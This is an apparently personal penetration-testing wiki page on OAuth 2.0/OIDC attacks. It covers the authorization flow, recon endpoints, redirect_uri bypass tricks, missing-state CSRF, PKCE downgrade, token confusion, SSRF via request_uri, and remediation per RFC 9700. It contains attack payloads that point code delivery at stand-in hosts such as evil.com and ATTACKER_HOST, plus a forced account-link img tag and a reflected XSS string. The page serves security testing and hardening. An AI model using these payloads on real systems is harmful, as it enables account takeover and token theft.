---
type: technique
title: OAuth 2.0 / OIDC attacks
lang: en
status: active
wstg: ["WSTG-ATHZ-05"]
owasp_top10: ["A07:2021", "A01:2021"]
owasp_api: ["API2:2023"]
asvs: ["V10.4.1", "V10.4.6", "V10.2.1", "V10.2.2", "V10.5.1"]
cwe: ["CWE-601", "CWE-352"]
attack: []
cvss: ""
sources: [payloadsallthethings, hacktricks, colleague-web-wiki]
updated: 2026-09-17
---

# OAuth 2.0 / OIDC attacks

**TL;DR** — "Log in with Google/Facebook/…" delegates authentication to an authorization
server (AS/IdP); the app (client) trusts the `code`/tokens it gets back. The recurring win is
**account takeover**: steal the `code`/token via a loosely-validated `redirect_uri`, or ride a
missing `state` to link the victim's account to the attacker. Most OAuth bugs are logic/flow
flaws, not memory-corruption — you attack the *parameters*.

> Framework: **A07:2021 – Auth Failures** / **A01:2021 – Broken Access Control**, `API2:2023`,
> `CWE-601` (open redirect via `redirect_uri`) / `CWE-352` (missing `state`). WSTG `WSTG-ATHZ-05`.

## Where it applies

Any "social login" / SSO ("Sign in with X"), delegated API access, and OIDC-based enterprise
login. Both the **AS side** (redirect/consent/token endpoints) and the **client side**
(callback handling, token storage) are in scope.

## How the flow works (primer)

Three actors: the **user** (resource owner), the **client** (the app / OIDC *relying party*),
and the **authorization server / IdP** (issues the `code` and tokens; in OIDC also a signed
**ID token** — a [[jwt-attacks|JWT]] describing the user).

**Authorization Code + PKCE (the secure default):**

```text
# 1. client → AS (front channel, in the browser)
GET /authorize?response_type=code&client_id=CLIENT&redirect_uri=https://client.example/cb
    &scope=openid%20profile&state=RANDOM&nonce=RANDOM
    &code_challenge=BASE64URL(SHA256(verifier))&code_challenge_method=S256
# 2. AS authenticates the user, redirects back:
→ https://client.example/cb?code=AUTH_CODE&state=RANDOM
# 3. client backend → AS (back channel)
POST /token   grant_type=authorization_code&code=AUTH_CODE&redirect_uri=...
    &client_id=CLIENT&client_secret=SECRET&code_verifier=VERIFIER
→ { access_token, refresh_token, id_token }
```

- A **`code`** is a one-time reference exchanged server-to-server (safe); a **`token`** is the
  bearer credential itself (dangerous in a URL).
- **Implicit flow** (`response_type=token`/`id_token token`) returns the token straight to the
  browser in the URL **fragment** (`#access_token=…`) — legacy, leak-prone, dropped by OAuth 2.1.
- **PKCE** binds the code to whoever started the flow (`code_challenge` at `/authorize`,
  `code_verifier` at `/token`) — protects public clients (SPA/mobile) from code interception.
- **`state`** = a per-session CSRF token echoed back. **`nonce`** = OIDC replay guard bound into
  the ID token.

## Recon

```text
/.well-known/openid-configuration        # OIDC discovery — endpoints + supported features
/.well-known/oauth-authorization-server  # OAuth AS metadata (RFC 8414)
/authorize   /token   /userinfo   /jwks.json   /register
```
Grep the discovery JSON for weakness signals: `registration_endpoint` reachable,
`token_endpoint_auth_methods_supported: ["none"]`, `implicit`/`password` in
`grant_types_supported`, or a missing `code_challenge_methods_supported` (no PKCE).

## Attacks

### 1. `redirect_uri` manipulation → account takeover (core primitive)

If the AS validates `redirect_uri` loosely, point it at your host so the `code`/token is
delivered to **you**; exchange the stolen `code` and you're in the victim's session. Bypass
catalogue (target host `client.example`, all inert):

```text
https://client.example.evil.com/cb      # suffix/subdomain trust
https://evilclient.example/cb           # prefix / substring trust
https://client.example@evil.com/cb      # @-userinfo: real host is evil.com
https://evil.com#client.example         # fragment confuses the parser
https://client.example.evil.com         # dot-not-escaped in a regex allowlist
https://client.example/../oauth/evil    # path normalization on the trusted host
https://client.example/cb/../../evil    # path traversal to an open-redirect subpath
http://client.example/cb                # non-HTTPS accepted
localhost.evil.com / punycode homograph # loopback / IDN tricks
```
Malicious authorization request + open-redirect chain on an allowlisted host:

```text
GET /authorize?response_type=code&client_id=CLIENT&redirect_uri=https://evil.example/cb&state=x
# chain: allowlist trusts accounts.idp.example, which has an open redirect
...&redirect_uri=https://accounts.idp.example/BackTo?next=https://evil.example
```

### 2. Missing / weak `state` → login CSRF & forced account-linking

No `state` binding on the callback = CSRF. The attacker completes OAuth with **their own** IdP
identity, captures their callback URL, and forces the victim's browser to load it — linking the
victim's app account to the **attacker's** social identity (attacker then logs into the
victim's account):

```text
<img src="https://client.example/cb?code=ATTACKER_AUTH_CODE">   <!-- no/unchecked state -->
```
Vulnerable patterns: `state` absent · not validated on return · predictable/no-entropy · fixated
(user-supplied) · not bound to the session ([[csrf]], `WSTG-SESS-05`).

### 3. PKCE downgrade / code interception / open registration

- **Downgrade:** strip `code_challenge` or set `code_challenge_method=plain`; then exchange a
  code at `/token` **without** a `code_verifier` — success ⇒ PKCE not enforced ⇒ an intercepted
  code is redeemable.
- **Open dynamic registration:** an unauthenticated `/register` with
  `token_endpoint_auth_methods_supported: none` lets the attacker register a public client with
  their own callback → PKCE gives no protection (attacker generated the verifier).

### 4. Implicit-flow token leakage

A token in the URL fragment leaks via browser history, the `Referer` header to third-party
CDNs/analytics, server logs, and `document.referrer`. Also via an attacker-controlled **subpath**
on the (trusted) redirect host that reads `window.location`, or an [[xss]]/proxy page. Prefer
code+PKCE; set `Referrer-Policy: no-referrer`; short token TTL.

### 5. `response_mode` / `response_type` juggling & scope escalation

```text
response_mode=query | fragment | form_post | web_message   # change the delivery channel
response_type=id_token,code&prompt=none                    # keep attacker in Referer for a chain
```
`web_message` delivers via `postMessage` — exploitable if the sender posts to `*` or the receiver
doesn't validate the origin. **Scope escalation:** if the AS trusts the `scope` at the token
request, or the resource server never checks the token's scope/`client_id`, request more than
was granted.

### 6. OIDC-specific — token & claim confusion

- **ID-token vs access-token confusion / `aud` not validated:** present an OIDC `id_token` (or a
  token minted for another `client_id`) at a resource server that checks only the signature, not
  `typ`(`at+jwt`)/`aud`/`iss` — accepted ⇒ ATO. See [[jwt-attacks]] (cross-JWT substitution).
- **Mutable-claim / email confusion:** the app links accounts by mutable `email`/`preferred_username`
  instead of immutable **`iss`+`sub`**; register `victim@corp.tld` at a provider that doesn't
  verify the mailbox → merged into the victim's account. Always bind on `iss`+`sub`, require
  `email_verified:true`.
- **Missing `nonce`** → ID-token replay / session fixation. **`iss` not validated** → accept a
  token from the wrong issuer.

### 7. IdP-side SSRF via `request_uri` / `jku`

```text
/authorize?...&request_uri=https://ATTACKER_HOST/req.jwt     # IdP fetches a remote Request Object → SSRF
```
Also attacker-set `jku`/`x5u` JOSE headers on the ID token/Request Object point the verifier at
your JWKS ([[ssrf]] + signature bypass — [[jwt-attacks]]). Server-side-fetched registration
fields (`logo_uri`, `jwks_uri`, `sector_identifier_uri`, `request_uris`) are SSRF sinks too.

### 8. Mix-up & 307 credential leak (multi-AS / RFC 9700)

- **Mix-up** (client federates with ≥2 IdPs): the attacker steers the flow so the client sends a
  code issued by the honest AS to the **attacker's** AS. Works when the client never checks *which*
  AS answered — test whether it verifies the `iss` response param (RFC 9207) or uses a distinct
  `redirect_uri` per issuer.
- **307 credential leak:** if the AS answers the login POST with **HTTP 307**, the browser
  **re-POSTs the username/password** to the `redirect_uri` — a malicious client harvests them. The
  fix is **303 See Other**; check the post-auth redirect status.

### 9. Pre-ATO, `prompt=none`, clickjacking consent, secret leakage

- **Pre-account-takeover:** register with the victim's email *before* they first use OAuth; the app
  links the IdP identity to the attacker's pre-existing account (esp. unverified signup email).
- **`prompt=none`** silently approves scopes/linking for an already-logged-in user.
- **Clickjacking the consent page** if the IdP `/authorize` is framable (no `X-Frame-Options` /
  `frame-ancestors`).
- **`client_secret` leakage** in an APK/IPA/Electron/SPA bundle → exchange any stolen `code`
  yourself; also test **code reuse rules** (single-use, short-lived: redeem twice, redeem after
  10 min, race two `/token` calls; a second use should fail *and* revoke minted tokens).

### 10. XSS / HTML injection via `redirect_uri` / `state` / error

```text
...&redirect_uri=data:text/html,a&state=<script>alert(document.domain)</script>   <!-- reflected state XSS -->
/cb?error=x&error_description=<injected-html>                                       <!-- trusted-origin phishing -->
```

## Confirming impact

Show a full account takeover: capture a victim's `code`/token via the redirect/`state` flaw and
use it to authenticate as them, or demonstrate the forced account-link. Severity typically
**High–Critical** (ATO).

## Remediation (OAuth 2.0 Security BCP, RFC 9700)

- **Exact-string `redirect_uri`** matching against pre-registered values (no wildcards/subpaths);
  never run an open redirector; HTTPS-only.
- **Authorization Code + PKCE (S256) for every client**; the AS must *require* PKCE (reject a
  token request whose `code_challenge` was absent). Disable **implicit** and **ROPC**.
- Bind CSRF to PKCE / OIDC `nonce`, else a one-time session-bound `state`.
- **Sender-constrain** (mTLS/DPoP) and **audience-restrict** access tokens; rotate/detect-replay
  refresh tokens for public clients. Validate `iss`/`aud`/`exp`/`nonce`; bind identity on
  `iss`+`sub`, require `email_verified`.
- **Mix-up defense** (verify `iss` / per-issuer `redirect_uri`); redirect credential-bearing
  requests with **303, never 307**; validate origins on any `postMessage` response. Full control
  set: [[colleague-web-wiki|oauth-security]] + [[jwt-attacks|token hardening]].

## Quick checklist

- [ ] Pull `/.well-known/*`; is PKCE required? implicit/ROPC enabled? `/register` open?
- [ ] `redirect_uri`: try subdomain/suffix/`@`/`#`/path-traversal/open-redirect-chain → does the code land on your host?
- [ ] `state`: absent / unchecked / predictable? → login-CSRF / forced account-linking.
- [ ] PKCE downgrade (no `code_verifier` at `/token`); implicit token leak via `Referer`.
- [ ] OIDC: `aud`/`iss`/`nonce` validated? ID-token used as access token? email-confusion linking?
- [ ] Confirm: capture a victim's `code`/token → authenticate as them (ATO).

## See also

[[jwt-attacks]] · [[authentication-attacks]] · [[csrf]] · [[open-redirect]] · [[ssrf]] · [[rest-api]] · [[oswa-exam]]

*Sources: [[payloadsallthethings]] + [[hacktricks]] (redirect_uri bypass catalogue, ATO chains, PortSwigger labs); [[colleague-web-wiki]] (WSTG-ATHZ-05, RFC 9700 remediation, mix-up/307).*
